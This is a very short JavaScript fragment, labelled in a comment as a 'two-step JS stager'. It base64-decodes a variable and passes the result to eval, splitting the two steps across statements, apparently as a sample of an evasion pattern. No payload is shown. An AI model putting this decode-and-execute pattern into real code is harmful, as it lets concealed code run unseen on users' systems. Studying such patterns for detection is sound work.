// Two-step JS stager: decode then execute, split across statements.
const p = atob(blob);
eval(p);
